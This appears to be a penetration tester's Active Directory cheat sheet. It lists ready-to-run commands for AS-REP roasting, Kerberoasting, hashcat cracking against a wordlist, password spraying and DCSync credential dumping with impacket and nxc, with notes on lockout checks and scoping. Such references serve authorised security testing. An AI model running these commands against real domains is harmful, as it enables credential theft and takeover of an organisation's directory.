# AD authentication checks

[← Active Directory quick reference](../05-active-directory.md)

Check lockout policy and existing failure count before password tests.

```bash
nxc smb <dc-ip> -u <user> -p '<password>' --pass-pol
```

## AS-REP roasting

AS-REP: known/scoped users without Kerberos pre-auth:

```bash
impacket-GetNPUsers <domain.tld>/ -dc-ip <dc-ip> -usersfile users.txt -no-pass -format hashcat
nxc ldap <dc-ip> -u <user> -p '<password>' --asreproast hashes.asreproast
hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt
```

## Kerberoasting

Kerberoast: user-backed SPNs; machine/managed-service passwords are usually poor crack targets.

```bash
impacket-GetUserSPNs -request -dc-ip <dc-ip> <domain.tld>/<user>
nxc ldap <dc-ip> -u <user> -p '<password>' --kerberoasting hashes.kerberoast
hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt
```

Spray one candidate across a scoped list only after checking lockout state:

```bash
nxc smb <dc-ip> -u users.txt -p '<candidate>' --continue-on-success
```

## Ticket and replication checks

Silver: service hash + domain SID + target SPN. Golden: `krbtgt` key.

DCSync requires directory replication rights.

```bash
impacket-secretsdump -just-dc <domain.tld>/<user>:<password>@<dc-ip>
```

Track credential source/account/service. NetNTLMv2 ≠ passable NT hash.
